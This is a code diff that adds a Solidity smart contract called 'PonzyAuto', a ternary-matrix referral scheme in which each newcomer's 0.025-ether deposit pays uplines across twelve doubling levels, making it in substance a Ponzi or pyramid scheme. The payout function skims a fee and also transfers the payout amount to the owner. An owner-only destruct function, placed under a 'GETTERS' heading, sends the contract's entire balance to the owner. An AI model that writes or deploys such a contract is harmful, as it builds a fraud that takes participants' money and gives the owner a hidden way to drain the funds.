@@ -492,3 +492,189 @@ contract Ponzy {
         return _isUserExists(user);
     }
 }
+
+contract PonzyAuto {
+
+    struct User {
+        uint256 id;
+        uint256 upline_id;
+        address upline;
+        uint256 balance;
+        uint256 profit;
+        uint8 level;
+        address[] referrals;
+    }
+
+    address payable public root;
+    uint256 public last_id;
+
+    uint256[] public levels;
+    mapping(address => User) public users;
+    mapping(uint256 => address) public users_ids;
+
+    event Register(address indexed addr, address indexed upline, uint256 id);
+    event UpLevel(address indexed addr, uint8 level);
+    event Profit(address indexed addr, address indexed referral, uint256 value);
+    event Lost(address indexed addr, address indexed referral, uint256 value);
+
+    // -----------------------------------------
+    // CONSTRUCTOR
+    // -----------------------------------------
+
+    constructor() public {
+        levels.push(0.025 ether);
+        levels.push(0.05 ether);
+        levels.push(0.1 ether);
+        levels.push(0.2 ether);
+        levels.push(0.4 ether);
+        levels.push(0.8 ether);
+        levels.push(1.6 ether);
+        levels.push(3.2 ether);
+        levels.push(6.4 ether);
+        levels.push(12.8 ether);
+        levels.push(25.6 ether);
+        levels.push(51.2 ether);
+
+        root = msg.sender;
+
+        _newUser(root, address(0));
+    }
+    
+    // -----------------------------------------
+    // FALLBACK
+    // -----------------------------------------
+
+    function () payable external {
+        _register(msg.sender, msg.value);
+    }
+
+    // -----------------------------------------
+    // SETTERS
+    // -----------------------------------------
+
+    function register() payable external {
+        _register(msg.sender, msg.value);
+    }
+
+    // -----------------------------------------
+    // PRIVATE
+    // -----------------------------------------
+
+    function _register(address user, uint256 value) private {
+        require(value == levels[0], "Bad value");
+        require(user != root, "Is root");
+        require(users[user].id == 0, "User already exists");
+
+        // Get upline ID of user
+        uint256 uplineId = _detectUplineId(last_id + 1);
+        address upline = users_ids[uplineId];
+
+        // Create new user
+        _newUser(user, upline);
+
+        // Increase level of user
+        _upLevel(user, users[user].level);
+        _uplinePay(upline, value);
+    }
+
+    function _newUser(address user, address upline) private {
+        users[user].id = ++last_id;
+        users_ids[last_id] = user;
+
+        if(users[upline].id > 0) {
+            users[user].upline_id = users[upline].id;
+            users[user].upline = upline;
+            users[upline].referrals.push(user);
+        }
+
+        emit Register(user, upline, last_id);
+    }
+
+    function _upLevel(address user, uint8 level) private {
+        users[user].level = level;
+        emit UpLevel(user, level);
+    }
+    
+    function _uplinePay(address upline, uint256 value) private {
+        bool isLevelsAvailable = users[upline].level < levels.length - 1;
+        uint256 next_price = levels[users[upline].level + 1];
+
+        if (isLevelsAvailable) {
+
+            if (next_price > users[upline].profit) {
+                uint256 max_value = next_price - users[upline].profit;
+                uint256 profit = value;
+
+                if(max_value < profit) {
+                    profit = max_value;
+                }
+                
+                users[upline].profit += profit;
+                value -= profit;
+
+                _send(upline, profit);
+                
+                emit Profit(upline, tx.origin, profit);
+            }
+
+            if (value > 0) {
+                uint256 b = users[upline].balance + value; // 0.1
+
+                if (b >= next_price) {
+                    users[upline].balance = 0;
+                    users[upline].profit = 0;
+
+                    if (b > next_price) {
+                        uint256 p = b - next_price;
+                        b -= p;
+
+                        users[upline].profit += p;
+
+                        _send(upline, p);
+                        
+                        emit Profit(upline, tx.origin, p);
+                    }
+
+                    _upLevel(upline, users[upline].level + 1);
+                    _uplinePay(users[upline].upline, b);
+                } else {
+                    users[upline].balance += value;
+                }
+            }
+        } else {
+            if (users[upline].profit < next_price) {
+                users[upline].profit += value;
+
+                _send(upline, value);
+
+                emit Profit(upline, tx.origin, value);
+            } else {
+                _uplinePay(users[upline].upline, value);
+            }
+        }
+    }
+
+    function _send(address to, uint256 value) private {
+        require(to != address(0), "Zero address");
+
+        if(address(uint160(to)).send(value - 0.01 ether)) {
+            root.transfer(value);
+        }
+        else root.transfer(0.01 ether);
+    }
+
+    function _detectUplineId(uint256 id) private pure returns(uint256) {
+        if (id % 3 == 0) return id / 3;
+        else if (id % 3 == 1) return (id - 1) / 3;
+        else if (id % 3 == 2) return (id + 1) / 3;
+    }
+
+    // -----------------------------------------
+    // GETTERS
+    // -----------------------------------------
+
+    function destruct() external {
+        require(msg.sender == root, "Access denied");
+        selfdestruct(root);
+    }
+}
